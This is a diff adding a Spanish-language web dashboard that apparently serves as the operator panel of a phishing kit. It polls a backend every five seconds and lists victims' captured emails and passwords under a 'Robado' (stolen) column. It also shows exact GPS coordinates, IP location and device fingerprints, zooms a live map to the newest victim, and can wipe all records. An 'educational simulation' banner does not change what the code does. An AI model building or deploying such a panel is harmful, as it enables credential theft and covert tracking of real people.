@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Terminal de Recolección</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+<style>
+  :root{--bg:#1a1a1a;--panel:#2a2a2a;--line:#444;--ink:#fff;--ink-dim:#aaa;--green:#00ff00;--danger:#ff0000;}
+  *{box-sizing:border-box;}
+  body{font-family:'Courier New', monospace;margin:0;padding:22px;background:var(--bg);color:var(--ink);}
+  .top{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;}
+  h2{margin:0;font-size:19px;color:var(--green);text-shadow:0 0 5px var(--green);}
+  button{padding:9px 16px;border:0;border-radius:5px;background:var(--green);color:#000;cursor:pointer;font-weight:bold;}
+  button:hover{opacity:0.8;}
+  .stats{display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap;}
+  .stat{background:var(--panel);border:1px solid var(--line);padding:12px 20px;border-radius:6px;}
+  .stat b{display:block;font-size:22px;color:var(--green);}
+  #map{height:360px;border-radius:6px;margin-bottom:16px;border:1px solid var(--line);}
+  select{background:var(--panel); color:#fff; padding:7px 10px;border-radius:5px;border:1px solid var(--line);}
+  .tabla{background:var(--panel);border:1px solid var(--line);border-radius:6px;overflow-x:auto;}
+  table{width:100%;border-collapse:collapse;font-size:13px;}
+  th,td{padding:8px 11px;text-align:left;border-bottom:1px solid var(--line);white-space:nowrap;}
+  tr:hover{background:#333;cursor:pointer;}
+  .ok{color:var(--green);font-weight:600;} .fail{color:var(--danger);font-weight:600;}
+  .aviso{background:#330000;border:1px solid var(--danger);color:#ff9999;
+         padding:10px 14px;border-radius:6px;font-size:12.5px;margin-bottom:16px;}
+</style>
+</head>
+<body>
+  <div class="top">
+    <h2>Terminal de Recolección de Datos</h2>
+    <button id="logout">Desconectar</button>
+  </div>
+
+  <div class="aviso">
+     Entorno de <b>simulación</b>. Los datos se muestran con fines educativos.
+  </div>
+
+  <div class="stats" id="stats"></div>
+
+  <div style="display:flex; justify-content:space-between; align-items:center; max-width: 600px; margin-bottom: 16px;">
+    <label>Mostrar:
+      <select id="filtro">
+        <option value="">Todos</option>
+        <option value="true">Solo exitosos</option>
+        <option value="false">Solo fallidos</option>
+      </select>
+    </label>
+    <button id="btnBorrarTodo" style="background:var(--danger); color:#fff; padding: 7px 12px; font-size:13px;">Borrar Todo</button>
+  </div>
+
+  <div id="map"></div>
+
+  <div class="tabla">
+    <table>
+      <thead>
+        <tr>
+          <th>Fecha</th><th>Datos Recolectados</th><th>Robado</th><th>Resultado</th><th>IP</th>
+          <th>Lugar (IP)</th><th>GPS exacto</th><th>Dispositivo</th><th>Navegador</th><th>Batería</th><th>Sistema</th>
+          <th>Pantalla</th><th>Resolución</th><th>Zona horaria</th><th>CPU</th><th>Acciones</th>
+        </tr>
+      </thead>
+      <tbody id="filas"></tbody>
+    </table>
+  </div>
+
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script>
+    /* global L */
+    const map = L.map('map').setView([23.6, -102.5], 4);
+    L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(map);
+    const capa = L.layerGroup().addTo(map);
+    let ultimoIdCargado = 0;
+
+    function texto(tag, contenido, clase) {
+      const el = document.createElement(tag);
+      el.textContent = contenido ?? '—';
+      if (clase) el.className = clase;
+      return el;
+    }
+
+    async function cargar() {
+      const f = document.getElementById('filtro').value;
+      const [r1, r2] = await Promise.all([
+        fetch('/api/admin/logins' + (f ? `?success=${f}` : '')),
+        fetch('/api/admin/stats')
+      ]);
+      if (r1.status === 401) return (location.href = '/login.html');
+      const eventos = await r1.json();
+      const s = await r2.json();
+
+      const stats = document.getElementById('stats');
+      stats.innerHTML = '';
+      for (const [etq, val] of [['Total', s.total], ['Exitosos', s.exitosos], ['Fallidos', s.fallidos], ['IPs únicas', s.ips_unicas], ['Con GPS', s.con_gps]]) {
+        const d = document.createElement('div');
+        d.className = 'stat';
+        d.append(texto('b', val), etq);
+        stats.appendChild(d);
+      }
+
+      capa.clearLayers();
+      const tbody = document.getElementById('filas');
+      tbody.innerHTML = '';
+      
+      for (const e of eventos) {
+        const lugarIp = [e.city, e.country].filter(Boolean).join(', ') || 'Desconocido';
+        const tieneGps = e.gps_lat != null;
+        const gpsTxt = tieneGps ? `${e.gps_lat.toFixed(5)}, ${e.gps_lng.toFixed(5)}` : '—';
+        const batTxt = e.battery_level ? `${e.battery_level} ${e.battery_charging ? '⚡' : ''}` : '—';
+        
+        // Arreglo visual para la IP
+        const ipTxt = e.ip && e.ip !== '::1' ? e.ip : (e.ip === '::1' ? 'Local' : '—');
+
+        const lat = tieneGps ? e.gps_lat : e.latitude;
+        const lng = tieneGps ? e.gps_lng : e.longitude;
+        let marcador = null;
+        if (lat != null) {
+          marcador = L.circleMarker([lat, lng], { radius: 7, color: e.success ? '#00ff00' : '#ff0000', fillOpacity: tieneGps ? 0.9 : 0.5 }).addTo(capa);
+          marcador.bindPopup(`<b>${e.email_tried}</b><br>${ipTxt} · ${tieneGps ? 'GPS exacto' : lugarIp}`);
+        }
+
+        const passTxt = e.password_tried || '—';
+        const btnBorrar = document.createElement('button');
+        btnBorrar.textContent = 'borrar';
+        btnBorrar.style.background = 'var(--danger)'; btnBorrar.style.padding = '4px 8px'; btnBorrar.style.color = '#fff';
+        btnBorrar.onclick = (ev) => { ev.stopPropagation(); borrarRegistro(e.id); };
+        const tdAccion = document.createElement('td');
+        tdAccion.appendChild(btnBorrar);
+
+        const tr = document.createElement('tr');
+        tr.append(
+          texto('td', new Date(e.created_at).toLocaleString('es-MX')),
+          texto('td', e.email_tried), // Aquí sale el Resumen de la Encuesta y si dieron cámara
+          texto('td', passTxt),
+          texto('td', e.success ? 'Exitoso' : 'Fallido', e.success ? 'ok' : 'fail'),
+          texto('td', ipTxt),
+          texto('td', lugarIp),
+          texto('td', gpsTxt),
+          texto('td', e.device),
+          texto('td', e.browser),
+          texto('td', batTxt),
+          texto('td', e.os),
+          texto('td', e.screen_res),
+          texto('td', e.language),
+          texto('td', e.timezone),
+          texto('td', e.cpu_cores),
+          tdAccion
+        );
+        if (marcador) tr.onclick = () => { map.setView(marcador.getLatLng(), 15); marcador.openPopup(); };
+        tbody.appendChild(tr);
+      }
+
+      if (eventos.length > 0) {
+        const ultimo = eventos[0];
+        if (ultimo.id > ultimoIdCargado) {
+          ultimoIdCargado = ultimo.id;
+          const latLive = ultimo.gps_lat || ultimo.latitude;
+          const lngLive = ultimo.gps_lng || ultimo.longitude;
+          if (latLive && lngLive) map.setView([latLive, lngLive], 15);
+        }
+      }
+    }
+
+    document.getElementById('filtro').addEventListener('change', cargar);
+    document.getElementById('logout').onclick = async () => { await fetch('/api/logout', { method: 'POST' }); location.href = '/login.html'; };
+
+    async function borrarRegistro(id) {
+      if (!confirm('¿Borrar este registro?')) return;
+      await fetch('/api/admin/logins/' + id, { method: 'DELETE' });
+      cargar();
+    }
+
+    document.getElementById('btnBorrarTodo').onclick = async () => {
+      if (!confirm('¿Borrar TODO? No se puede deshacer.')) return;
+      await fetch('/api/admin/logins', { method: 'DELETE' });
+      cargar();
+    };
+
+    cargar();
+    setInterval(cargar, 5000);
+  </script>
+</body>
+</html>
